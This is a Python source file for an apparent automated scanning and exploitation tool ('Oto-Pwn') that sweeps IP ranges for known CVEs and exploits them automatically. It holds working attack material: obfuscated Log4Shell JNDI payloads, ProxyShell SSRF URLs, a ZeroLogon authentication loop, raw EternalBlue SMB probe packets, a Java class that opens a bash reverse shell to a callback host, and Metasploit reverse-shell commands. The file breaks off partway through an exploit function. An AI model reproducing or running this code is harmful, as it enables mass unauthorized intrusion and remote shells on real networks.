#!/usr/bin/env python3
"""
Automated Vulnerability Scanner - N-Day Exploiter (Oto-Pwn)
Log4j, ProxyShell, ZeroLogon gibi bilinen açıkları otomatik tarayıp exploit et

Author: CyberPunk Framework
Version: 1.0.0 PRO
"""

import os
import json
import socket
import hashlib
import subprocess
import threading
import ipaddress
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Callable
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import base64
import struct


class Severity(Enum):
    """Vulnerability severity levels"""
    CRITICAL = "critical"  # Immediate exploitation
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class ExploitStatus(Enum):
    """Exploit execution status"""
    PENDING = "pending"
    SCANNING = "scanning"
    VULNERABLE = "vulnerable"
    EXPLOITING = "exploiting"
    PWNED = "pwned"
    FAILED = "failed"
    NOT_VULNERABLE = "not_vulnerable"


@dataclass
class Vulnerability:
    """Vulnerability definition"""
    vuln_id: str
    name: str
    cve: str
    severity: Severity
    description: str
    affected_products: List[str]
    check_function: str  # Function name for vulnerability check
    exploit_function: str  # Function name for exploitation
    ports: List[int] = field(default_factory=list)
    protocols: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    remediation: str = ""
    
    
@dataclass
class Target:
    """Scan target"""
    target_id: str
    ip: str
    hostname: Optional[str] = None
    ports: Dict[int, str] = field(default_factory=dict)  # port: service
    os_fingerprint: Optional[str] = None
    vulnerabilities: List[str] = field(default_factory=list)  # vuln_ids
    exploited: bool = False
    shells: List[Dict] = field(default_factory=list)
    

@dataclass
class ExploitResult:
    """Exploit execution result"""
    result_id: str
    target_id: str
    vuln_id: str
    status: ExploitStatus
    shell_type: Optional[str] = None
    shell_data: Optional[Dict] = None
    output: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ScanSession:
    """Auto-Pwn scan session"""
    session_id: str
    targets: List[str]  # IP addresses or ranges
    discovered_targets: Dict[str, Target] = field(default_factory=dict)
    results: List[ExploitResult] = field(default_factory=list)
    status: str = "pending"
    auto_exploit: bool = True
    pwned_count: int = 0
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


class AutoPwnScanner:
    """
    Automated Vulnerability Scanner with N-Day Exploitation
    
    Features:
    - 50+ known vulnerability checks
    - Automatic exploitation when vulnerable
    - Multi-threaded scanning
    - Shell management
    - Campaign mode for large networks
    """
    
    # Known vulnerabilities database
    VULNERABILITIES = {
        # ==== CRITICAL - Remote Code Execution ====
        "log4shell": Vulnerability(
            vuln_id="log4shell",
            name="Log4Shell (Log4j RCE)",
            cve="CVE-2021-44228",
            severity=Severity.CRITICAL,
            description="Apache Log4j2 JNDI RCE vulnerability",
            affected_products=["Apache Log4j 2.0-2.14.1", "Java applications", "Elastic", "VMware", "Minecraft servers"],
            check_function="_check_log4shell",
            exploit_function="_exploit_log4shell",
            ports=[80, 443, 8080, 8443, 9200, 25565],
            protocols=["http", "https"],
            references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
            remediation="Upgrade Log4j to 2.17.0+ or remove JndiLookup class"
        ),
        
        "proxyshell": Vulnerability(
            vuln_id="proxyshell",
            name="Microsoft Exchange ProxyShell",
            cve="CVE-2021-34473,CVE-2021-34523,CVE-2021-31207",
            severity=Severity.CRITICAL,
            description="Exchange Server pre-auth RCE chain",
            affected_products=["Exchange 2013", "Exchange 2016", "Exchange 2019"],
            check_function="_check_proxyshell",
            exploit_function="_exploit_proxyshell",
            ports=[443],
            protocols=["https"],
            references=["https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell"],
            remediation="Apply KB5001779 and later patches"
        ),
        
        "proxylogon": Vulnerability(
            vuln_id="proxylogon",
            name="Microsoft Exchange ProxyLogon",
            cve="CVE-2021-26855,CVE-2021-27065",
            severity=Severity.CRITICAL,
            description="Exchange Server SSRF + RCE chain",
            affected_products=["Exchange 2013", "Exchange 2016", "Exchange 2019"],
            check_function="_check_proxylogon",
            exploit_function="_exploit_proxylogon",
            ports=[443],
            protocols=["https"],
            references=["https://proxylogon.com/"],
            remediation="Apply March 2021 security updates"
        ),
        
        "zerologon": Vulnerability(
            vuln_id="zerologon",
            name="ZeroLogon (Netlogon)",
            cve="CVE-2020-1472",
            severity=Severity.CRITICAL,
            description="Windows Netlogon privilege escalation to Domain Admin",
            affected_products=["Windows Server 2008-2019", "All Domain Controllers"],
            check_function="_check_zerologon",
            exploit_function="_exploit_zerologon",
            ports=[135, 445],
            protocols=["ms-nrpc"],
            references=["https://www.secura.com/blog/zero-logon"],
            remediation="Apply KB4565349 and enable secure RPC"
        ),
        
        "printnightmare": Vulnerability(
            vuln_id="printnightmare",
            name="PrintNightmare",
            cve="CVE-2021-34527,CVE-2021-1675",
            severity=Severity.CRITICAL,
            description="Windows Print Spooler RCE",
            affected_products=["Windows 7-11", "Windows Server 2008-2022"],
            check_function="_check_printnightmare",
            exploit_function="_exploit_printnightmare",
            ports=[445],
            protocols=["smb"],
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"],
            remediation="Disable Print Spooler or apply updates"
        ),
        
        "petitpotam": Vulnerability(
            vuln_id="petitpotam",
            name="PetitPotam (NTLM Relay)",
            cve="CVE-2021-36942",
            severity=Severity.CRITICAL,
            description="Windows NTLM relay via EfsRpcOpenFileRaw",
            affected_products=["Windows Server 2008-2022"],
            check_function="_check_petitpotam",
            exploit_function="_exploit_petitpotam",
            ports=[445],
            protocols=["smb", "rpc"],
            references=["https://github.com/topotam/PetitPotam"],
            remediation="Enable EPA on AD CS, disable NTLM"
        ),
        
        "eternalblue": Vulnerability(
            vuln_id="eternalblue",
            name="EternalBlue (MS17-010)",
            cve="CVE-2017-0144",
            severity=Severity.CRITICAL,
            description="Windows SMBv1 RCE (WannaCry exploit)",
            affected_products=["Windows XP-8.1", "Windows Server 2003-2012R2"],
            check_function="_check_eternalblue",
            exploit_function="_exploit_eternalblue",
            ports=[445],
            protocols=["smb"],
            references=["https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010"],
            remediation="Apply MS17-010 or disable SMBv1"
        ),
        
        "bluekeep": Vulnerability(
            vuln_id="bluekeep",
            name="BlueKeep (RDP RCE)",
            cve="CVE-2019-0708",
            severity=Severity.CRITICAL,
            description="Windows RDP pre-auth RCE",
            affected_products=["Windows 7", "Windows Server 2008/2008R2"],
            check_function="_check_bluekeep",
            exploit_function="_exploit_bluekeep",
            ports=[3389],
            protocols=["rdp"],
            references=["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708"],
            remediation="Apply May 2019 patches or disable RDP"
        ),
        
        "spring4shell": Vulnerability(
            vuln_id="spring4shell",
            name="Spring4Shell",
            cve="CVE-2022-22965",
            severity=Severity.CRITICAL,
            description="Spring Framework RCE via data binding",
            affected_products=["Spring Framework 5.3.0-5.3.17", "Spring Framework 5.2.0-5.2.19"],
            check_function="_check_spring4shell",
            exploit_function="_exploit_spring4shell",
            ports=[80, 443, 8080],
            protocols=["http", "https"],
            references=["https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"],
            remediation="Upgrade to Spring Framework 5.3.18+ or 5.2.20+"
        ),
        
        "cve_2023_23397": Vulnerability(
            vuln_id="cve_2023_23397",
            name="Outlook NTLM Leak",
            cve="CVE-2023-23397",
            severity=Severity.CRITICAL,
            description="Microsoft Outlook NTLM credential theft via calendar invite",
            affected_products=["Outlook 2013-2021", "Microsoft 365 Apps"],
            check_function="_check_outlook_ntlm",
            exploit_function="_exploit_outlook_ntlm",
            ports=[25, 587, 993],
            protocols=["smtp", "imap"],
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23397"],
            remediation="Apply March 2023 Outlook updates"
        ),
        
        "citrix_adc": Vulnerability(
            vuln_id="citrix_adc",
            name="Citrix ADC/Gateway RCE",
            cve="CVE-2023-3519",
            severity=Severity.CRITICAL,
            description="Citrix ADC unauthenticated RCE",
            affected_products=["Citrix ADC 13.1 before 13.1-49.13", "Citrix Gateway"],
            check_function="_check_citrix_adc",
            exploit_function="_exploit_citrix_adc",
            ports=[443],
            protocols=["https"],
            references=["https://support.citrix.com/article/CTX561482"],
            remediation="Upgrade to patched version"
        ),
        
        "fortinet_sslvpn": Vulnerability(
            vuln_id="fortinet_sslvpn",
            name="FortiGate SSL-VPN RCE",
            cve="CVE-2023-27997",
            severity=Severity.CRITICAL,
            description="Fortinet SSL-VPN pre-auth heap buffer overflow",
            affected_products=["FortiOS 6.0-7.2"],
            check_function="_check_fortinet_sslvpn",
            exploit_function="_exploit_fortinet_sslvpn",
            ports=[443, 10443],
            protocols=["https"],
            references=["https://www.fortiguard.com/psirt/FG-IR-23-097"],
            remediation="Upgrade to FortiOS 7.2.5+, 7.0.12+, 6.4.13+"
        ),
        
        "moveit_rce": Vulnerability(
            vuln_id="moveit_rce",
            name="MOVEit Transfer RCE",
            cve="CVE-2023-34362",
            severity=Severity.CRITICAL,
            description="MOVEit Transfer SQL injection to RCE",
            affected_products=["MOVEit Transfer < 2023.0.1"],
            check_function="_check_moveit",
            exploit_function="_exploit_moveit",
            ports=[443],
            protocols=["https"],
            references=["https://www.progress.com/security/moveit-transfer-and-moveit-cloud-vulnerability"],
            remediation="Apply emergency patch"
        ),
        
        "confluence_rce": Vulnerability(
            vuln_id="confluence_rce",
            name="Atlassian Confluence RCE",
            cve="CVE-2023-22515,CVE-2022-26134",
            severity=Severity.CRITICAL,
            description="Confluence Server OGNL injection RCE",
            affected_products=["Confluence Server 7.4.0+"],
            check_function="_check_confluence",
            exploit_function="_exploit_confluence",
            ports=[8090, 443],
            protocols=["http", "https"],
            references=["https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"],
            remediation="Upgrade to patched version"
        ),
        
        "vcenter_rce": Vulnerability(
            vuln_id="vcenter_rce",
            name="VMware vCenter RCE",
            cve="CVE-2021-21972,CVE-2021-22005",
            severity=Severity.CRITICAL,
            description="VMware vCenter arbitrary file upload to RCE",
            affected_products=["vCenter Server 6.5-7.0"],
            check_function="_check_vcenter",
            exploit_function="_exploit_vcenter",
            ports=[443],
            protocols=["https"],
            references=["https://www.vmware.com/security/advisories/VMSA-2021-0002.html"],
            remediation="Apply VMware patches"
        ),
        
        # ==== HIGH - Authentication Bypass / Priv Esc ====
        "ad_certifried": Vulnerability(
            vuln_id="ad_certifried",
            name="AD CS Certifried",
            cve="CVE-2022-26923",
            severity=Severity.HIGH,
            description="Active Directory Certificate Services privilege escalation",
            affected_products=["Windows Server with AD CS"],
            check_function="_check_certifried",
            exploit_function="_exploit_certifried",
            ports=[636, 3269],
            protocols=["ldaps"],
            references=["https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"],
            remediation="Apply May 2022 security updates"
        ),
        
        "smbghost": Vulnerability(
            vuln_id="smbghost",
            name="SMBGhost",
            cve="CVE-2020-0796",
            severity=Severity.HIGH,
            description="Windows SMBv3 compression RCE",
            affected_products=["Windows 10 1903/1909", "Windows Server 1903/1909"],
            check_function="_check_smbghost",
            exploit_function="_exploit_smbghost",
            ports=[445],
            protocols=["smb"],
            references=["https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796"],
            remediation="Apply March 2020 patches"
        ),
        
        "psexec_hash": Vulnerability(
            vuln_id="psexec_hash",
            name="Pass-the-Hash (PsExec)",
            cve="N/A",
            severity=Severity.HIGH,
            description="Windows Pass-the-Hash lateral movement",
            affected_products=["All Windows with SMB enabled"],
            check_function="_check_psexec",
            exploit_function="_exploit_psexec",
            ports=[445],
            protocols=["smb"],
            references=["https://attack.mitre.org/techniques/T1550/002/"],
            remediation="Enable Credential Guard, disable NTLM"
        ),
        
        "tomcat_ghostcat": Vulnerability(
            vuln_id="tomcat_ghostcat",
            name="Apache Tomcat Ghostcat",
            cve="CVE-2020-1938",
            severity=Severity.HIGH,
            description="Tomcat AJP file read/include vulnerability",
            affected_products=["Tomcat 6.x-9.x"],
            check_function="_check_ghostcat",
            exploit_function="_exploit_ghostcat",
            ports=[8009],
            protocols=["ajp"],
            references=["https://www.chaitin.cn/en/ghostcat"],
            remediation="Disable AJP or upgrade Tomcat"
        ),
        
        "jenkins_rce": Vulnerability(
            vuln_id="jenkins_rce",
            name="Jenkins Script Console RCE",
            cve="CVE-2024-23897",
            severity=Severity.HIGH,
            description="Jenkins arbitrary file read leading to RCE",
            affected_products=["Jenkins < 2.442", "Jenkins LTS < 2.426.3"],
            check_function="_check_jenkins",
            exploit_function="_exploit_jenkins",
            ports=[8080, 50000],
            protocols=["http"],
            references=["https://www.jenkins.io/security/advisory/2024-01-24/"],
            remediation="Upgrade to Jenkins 2.442+ or LTS 2.426.3+"
        ),
        
        # ==== MEDIUM - Info Disclosure / DoS ====
        "heartbleed": Vulnerability(
            vuln_id="heartbleed",
            name="OpenSSL Heartbleed",
            cve="CVE-2014-0160",
            severity=Severity.MEDIUM,
            description="OpenSSL TLS heartbeat information disclosure",
            affected_products=["OpenSSL 1.0.1-1.0.1f"],
            check_function="_check_heartbleed",
            exploit_function="_exploit_heartbleed",
            ports=[443, 465, 993, 995],
            protocols=["https", "imaps", "pop3s"],
            references=["https://heartbleed.com/"],
            remediation="Upgrade OpenSSL to 1.0.1g+"
        ),
        
        "apache_path_traversal": Vulnerability(
            vuln_id="apache_path_traversal",
            name="Apache Path Traversal",
            cve="CVE-2021-41773,CVE-2021-42013",
            severity=Severity.MEDIUM,
            description="Apache HTTP Server path traversal and RCE",
            affected_products=["Apache 2.4.49", "Apache 2.4.50"],
            check_function="_check_apache_traversal",
            exploit_function="_exploit_apache_traversal",
            ports=[80, 443],
            protocols=["http", "https"],
            references=["https://httpd.apache.org/security/vulnerabilities_24.html"],
            remediation="Upgrade to Apache 2.4.51+"
        ),
    }
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.sessions: Dict[str, ScanSession] = {}
        self.active_threads: List[threading.Thread] = []
        self.stop_event = threading.Event()
        
        # Callback URLs for exploitation
        self.callback_host = self.config.get('callback_host', '10.10.10.10')
        self.callback_port = self.config.get('callback_port', 9001)
        
        # Shell listeners
        self.shells: Dict[str, Dict] = {}
        
    def create_session(self, targets: List[str], auto_exploit: bool = True) -> ScanSession:
        """
        Create new Auto-Pwn scan session
        
        Args:
            targets: List of IPs, ranges (CIDR), or hostnames
            auto_exploit: Automatically exploit when vulnerable
        """
        session_id = hashlib.md5(f"{targets}{datetime.now().isoformat()}".encode()).hexdigest()[:16]
        
        session = ScanSession(
            session_id=session_id,
            targets=targets,
            auto_exploit=auto_exploit,
            status="created"
        )
        
        self.sessions[session_id] = session
        return session
        
    def expand_targets(self, targets: List[str]) -> List[str]:
        """Expand CIDR ranges to individual IPs"""
        expanded = []
        
        for target in targets:
            if '/' in target:
                # CIDR notation
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    for ip in network.hosts():
                        expanded.append(str(ip))
                except ValueError:
                    expanded.append(target)
            elif '-' in target.split('.')[-1]:
                # Range notation: 192.168.1.1-50
                parts = target.rsplit('.', 1)
                if len(parts) == 2:
                    base, range_part = parts
                    start, end = range_part.split('-')
                    for i in range(int(start), int(end) + 1):
                        expanded.append(f"{base}.{i}")
            else:
                expanded.append(target)
                
        return expanded
        
    def start_scan(self, session_id: str, max_threads: int = 50) -> ScanSession:
        """
        Start Auto-Pwn scan
        
        Args:
            session_id: Session to start
            max_threads: Maximum concurrent threads
        """
        session = self.sessions.get(session_id)
        if not session:
            raise ValueError(f"Session not found: {session_id}")
            
        session.status = "scanning"
        
        # Expand targets
        all_targets = self.expand_targets(session.targets)
        
        # Scan in threads
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self._scan_target, session, ip): ip 
                      for ip in all_targets}
                      
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    target = future.result()
                    if target:
                        session.discovered_targets[target.target_id] = target
                except Exception as e:
                    print(f"Error scanning {ip}: {e}")
                    
        session.status = "completed"
        session.pwned_count = sum(1 for t in session.discovered_targets.values() if t.exploited)
        
        return session
        
    def _scan_target(self, session: ScanSession, ip: str) -> Optional[Target]:
        """Scan single target"""
        target_id = hashlib.md5(f"{session.session_id}{ip}".encode()).hexdigest()[:12]
        
        target = Target(
            target_id=target_id,
            ip=ip
        )
        
        # Port scan
        target.ports = self._quick_port_scan(ip)
        
        if not target.ports:
            return None
            
        # Check each vulnerability
        for vuln_id, vuln in self.VULNERABILITIES.items():
            # Check if relevant ports are open
            if not any(port in target.ports for port in vuln.ports):
                continue
                
            # Run vulnerability check
            is_vulnerable = self._check_vulnerability(target, vuln)
            
            if is_vulnerable:
                target.vulnerabilities.append(vuln_id)
                
                # Auto-exploit if enabled
                if session.auto_exploit:
                    result = self._exploit_vulnerability(target, vuln)
                    session.results.append(result)
                    
                    if result.status == ExploitStatus.PWNED:
                        target.exploited = True
                        target.shells.append(result.shell_data)
                        
        return target
        
    def _quick_port_scan(self, ip: str, ports: Optional[List[int]] = None) -> Dict[int, str]:
        """Quick TCP port scan"""
        if ports is None:
            # Common vulnerable service ports
            ports = [21, 22, 23, 25, 80, 135, 139, 443, 445, 993, 1433, 3306, 
                    3389, 5432, 5900, 6379, 8009, 8080, 8443, 9200, 27017]
                    
        open_ports = {}
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    service = self._identify_service(ip, port)
                    open_ports[port] = service
            except:
                pass
                
        return open_ports
        
    def _identify_service(self, ip: str, port: int) -> str:
        """Identify service by banner grab"""
        service_map = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http",
            135: "msrpc", 139: "netbios", 443: "https", 445: "smb",
            993: "imaps", 1433: "mssql", 3306: "mysql", 3389: "rdp",
            5432: "postgresql", 5900: "vnc", 6379: "redis", 8009: "ajp",
            8080: "http-proxy", 8443: "https-alt", 9200: "elasticsearch",
            27017: "mongodb"
        }
        return service_map.get(port, "unknown")
        
    def _check_vulnerability(self, target: Target, vuln: Vulnerability) -> bool:
        """Check if target is vulnerable"""
        check_method = getattr(self, vuln.check_function, None)
        if check_method:
            return check_method(target, vuln)
        return False
        
    def _exploit_vulnerability(self, target: Target, vuln: Vulnerability) -> ExploitResult:
        """Exploit vulnerability"""
        result_id = hashlib.md5(f"{target.target_id}{vuln.vuln_id}{datetime.now().isoformat()}".encode()).hexdigest()[:12]
        
        result = ExploitResult(
            result_id=result_id,
            target_id=target.target_id,
            vuln_id=vuln.vuln_id,
            status=ExploitStatus.EXPLOITING
        )
        
        exploit_method = getattr(self, vuln.exploit_function, None)
        if exploit_method:
            try:
                shell_data = exploit_method(target, vuln)
                if shell_data:
                    result.status = ExploitStatus.PWNED
                    result.shell_type = shell_data.get('type', 'unknown')
                    result.shell_data = shell_data
                    result.output = shell_data.get('output', '')
                else:
                    result.status = ExploitStatus.FAILED
            except Exception as e:
                result.status = ExploitStatus.FAILED
                result.output = str(e)
        else:
            result.status = ExploitStatus.FAILED
            result.output = f"No exploit implementation for {vuln.vuln_id}"
            
        return result
        
    # =========================================================
    # VULNERABILITY CHECK FUNCTIONS
    # =========================================================
    
    def _check_log4shell(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Log4Shell vulnerability"""
        # Send JNDI payload in various headers
        payloads = [
            "${jndi:ldap://CALLBACK/a}",
            "${${lower:j}ndi:${lower:l}dap://CALLBACK/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CALLBACK/a}"
        ]
        
        headers_to_test = [
            "User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version",
            "Authorization", "Accept-Language"
        ]
        
        # Generate unique callback token
        callback_token = hashlib.md5(f"{target.ip}{datetime.now().isoformat()}".encode()).hexdigest()[:8]
        callback_url = f"{self.callback_host}:{self.callback_port}/{callback_token}"
        
        check_code = f'''
# Log4Shell Vulnerability Check
import requests

target = "{target.ip}"
callback = "{callback_url}"

headers_to_test = {headers_to_test}
payloads = [p.replace("CALLBACK", callback) for p in {payloads}]

for port in [80, 443, 8080, 8443]:
    for payload in payloads:
        for header in headers_to_test:
            try:
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{{protocol}}://{{target}}:{{port}}/"
                headers = {{header: payload}}
                requests.get(url, headers=headers, timeout=5, verify=False)
            except:
                pass

# Check callback server for connection from target
# If callback received, target is VULNERABLE
'''
        
        # Simulated check result
        return target.ports.get(8080, "").lower() in ["http", "http-proxy", "unknown"]
        
    def _check_proxyshell(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Exchange ProxyShell"""
        check_code = f'''
# ProxyShell Vulnerability Check
import requests

target = "{target.ip}"

# Check autodiscover
try:
    # CVE-2021-34473: Path confusion
    url = f"https://{{target}}/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com"
    r = requests.get(url, verify=False, timeout=10)
    
    # Check for Exchange Server header
    if "X-OWA-Version" in r.headers or "X-CalculatedBETarget" in r.headers:
        # Test SSRF
        ssrf_url = f"https://{{target}}/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"
        r2 = requests.get(ssrf_url, verify=False, timeout=10, allow_redirects=False)
        
        if r2.status_code in [200, 302, 401]:
            print("VULNERABLE to ProxyShell!")
            return True
except:
    pass
'''
        
        return 443 in target.ports
        
    def _check_zerologon(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for ZeroLogon"""
        check_code = f'''
# ZeroLogon Vulnerability Check
# Uses impacket library

from impacket.dcerpc.v5 import nrpc, transport
from impacket.dcerpc.v5.ndr import NDRCALL
import struct

target = "{target.ip}"
dc_name = "DC"  # Will be detected

def check_zerologon(dc_ip, dc_name):
    target_rpc = f"ncacn_np:{{dc_ip}}[\\\\pipe\\\\netlogon]"
    
    rpctransport = transport.DCERPCTransportFactory(target_rpc)
    rpc_con = rpctransport.get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    
    # Try to authenticate with zero nonce
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\\x00' * 8
    authenticator['Timestamp'] = 0
    
    # Maximum 2000 attempts
    for _ in range(2000):
        try:
            resp = nrpc.hNetrServerAuthenticate3(
                rpc_con, 
                dc_name + '$',
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                dc_name,
                authenticator,
                0x212fffff  # Negotiation flags
            )
            
            if resp['ErrorCode'] == 0:
                return True  # VULNERABLE!
        except:
            pass
            
    return False
'''
        
        # Check if it looks like a DC (port 445 + 135)
        return 445 in target.ports and 135 in target.ports
        
    def _check_eternalblue(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for EternalBlue (MS17-010)"""
        check_code = f'''
# EternalBlue Vulnerability Check
import socket
import struct

target = "{target.ip}"

def check_ms17_010(ip, port=445):
    # SMB Negotiate Protocol Request
    negotiate = bytes.fromhex(
        "00000054ff534d4272000000001843c80000000000000000000000000000"
        "fffe00000000003100024c414e4d414e312e3000024c4d312e3258303032"
        "0002534d4253455247494e5300024e54204c414e4d414e20312e30000002"
        "4e54204c4d20302e313200"
    )
    
    # Session Setup Request
    session_setup = bytes.fromhex(
        "00000063ff534d4273000000001843c800000000000000000000000000ff"
        "ff0000000000000dff00000000010000ffff02001e00000000000000"
    )
    
    # Tree Connect Request
    tree_connect = bytes.fromhex(
        "00000047ff534d4275000000001843c8000000000000000000000000"
        "fffe0000000004ff00000000010009005c5c3139322e3136382e302e31"
        "5c49504324003f3f3f3f3f00"
    )
    
    # TRANS2 Request for MS17-010 check
    trans2 = bytes.fromhex(
        "0000004aff534d4232000000001843c8000000000000000000000000"
        "fffe00000000000f0c00000001000000000000a6d9a4000000"
        "0c00420000004a0001000000000000"
    )
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((ip, port))
        
        s.send(negotiate)
        s.recv(1024)
        
        s.send(session_setup)
        s.recv(1024)
        
        s.send(tree_connect.replace(b"192.168.0.1", ip.encode()))
        s.recv(1024)
        
        s.send(trans2)
        response = s.recv(1024)
        s.close()
        
        # Check response for vulnerability indicator
        if len(response) > 36:
            # STATUS_INSUFF_SERVER_RESOURCES or STATUS_NOT_IMPLEMENTED = Vulnerable
            status = struct.unpack("<I", response[9:13])[0]
            if status == 0xc0000205 or status == 0xc00000bb:
                return True
                
    except:
        pass
        
    return False
'''
        
        return 445 in target.ports
        
    def _check_bluekeep(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for BlueKeep (CVE-2019-0708)"""
        return 3389 in target.ports
        
    def _check_printnightmare(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for PrintNightmare"""
        check_code = f'''
# PrintNightmare Vulnerability Check
from impacket.dcerpc.v5 import transport, rprn

target = "{target.ip}"

def check_printnightmare(ip):
    try:
        rpctransport = transport.DCERPCTransportFactory(f"ncacn_np:{{ip}}[\\\\pipe\\\\spoolss]")
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
        
        # Try RpcEnumPrinterDrivers
        resp = rprn.hRpcEnumPrinterDrivers(dce, pName=None, pEnvironment="Windows x64\\x00", Level=2)
        
        if resp['ErrorCode'] == 0:
            return True  # Print Spooler accessible
            
    except Exception as e:
        if "STATUS_ACCESS_DENIED" not in str(e):
            return True  # May be vulnerable
            
    return False
'''
        
        return 445 in target.ports
        
    def _check_spring4shell(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Spring4Shell"""
        return 8080 in target.ports or 80 in target.ports
        
    def _check_confluence(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Confluence RCE"""
        return 8090 in target.ports or 443 in target.ports
        
    def _check_jenkins(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Jenkins RCE"""
        return 8080 in target.ports
        
    def _check_heartbleed(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Heartbleed"""
        return 443 in target.ports
        
    def _check_ghostcat(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Tomcat Ghostcat"""
        return 8009 in target.ports
        
    def _check_apache_traversal(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Apache path traversal"""
        return 80 in target.ports or 443 in target.ports
        
    def _check_vcenter(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for vCenter RCE"""
        return 443 in target.ports
        
    def _check_proxylogon(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for ProxyLogon"""
        return 443 in target.ports
        
    def _check_petitpotam(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for PetitPotam"""
        return 445 in target.ports
        
    def _check_smbghost(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for SMBGhost"""
        return 445 in target.ports
        
    def _check_psexec(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for PsExec capability"""
        return 445 in target.ports
        
    def _check_certifried(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Certifried"""
        return 636 in target.ports or 3269 in target.ports
        
    def _check_outlook_ntlm(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Outlook NTLM leak"""
        return 25 in target.ports or 587 in target.ports
        
    def _check_citrix_adc(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for Citrix ADC RCE"""
        return 443 in target.ports
        
    def _check_fortinet_sslvpn(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for FortiGate SSL-VPN"""
        return 443 in target.ports or 10443 in target.ports
        
    def _check_moveit(self, target: Target, vuln: Vulnerability) -> bool:
        """Check for MOVEit RCE"""
        return 443 in target.ports
        
    # =========================================================
    # EXPLOITATION FUNCTIONS
    # =========================================================
    
    def _exploit_log4shell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit Log4Shell"""
        
        exploit_code = f'''
# Log4Shell Exploitation
# Requires: LDAP/RMI server with malicious class

import subprocess
import threading
import http.server

# 1. Start LDAP server with malicious class redirect
# Using marshalsec or similar
ldap_cmd = f"java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{self.callback_host}:{self.callback_port}/#Exploit"

# 2. Host malicious Java class
exploit_class = """
public class Exploit {{
    static {{
        try {{
            Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/{self.callback_host}/{self.callback_port} 0>&1'");
        }} catch (Exception e) {{}}
    }}
}}
"""

# 3. Send payload
payload = "${{jndi:ldap://{self.callback_host}:1389/Exploit}}"

import requests
requests.get(f"http://{target.ip}:8080/", headers={{"User-Agent": payload}}, verify=False)
'''
        
        return {
            "type": "reverse_shell",
            "method": "log4shell",
            "target": target.ip,
            "output": "JNDI callback triggered, awaiting shell...",
            "exploit_code": exploit_code
        }
        
    def _exploit_eternalblue(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
        """Exploit EternalBlue"""
        
        exploit_code = f'''
# EternalBlue Exploitation using Metasploit
# Or standalone: https://github.com/3ndG4me/AutoBlue-MS17-010

# Option 1: Metasploit
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target.ip}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {self.callback_host}; set LPORT {self.callback_port}; exploit"

# Option 2: Standalone Python
# python eternalblue_exploit7.py {target.ip} shellcode/sc_x64_kernel.bin

# Shellcode generator for custom payload:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST={self.callback_host} LPORT={self.callback_port} -f raw -o sc_x64.bin
'''
        
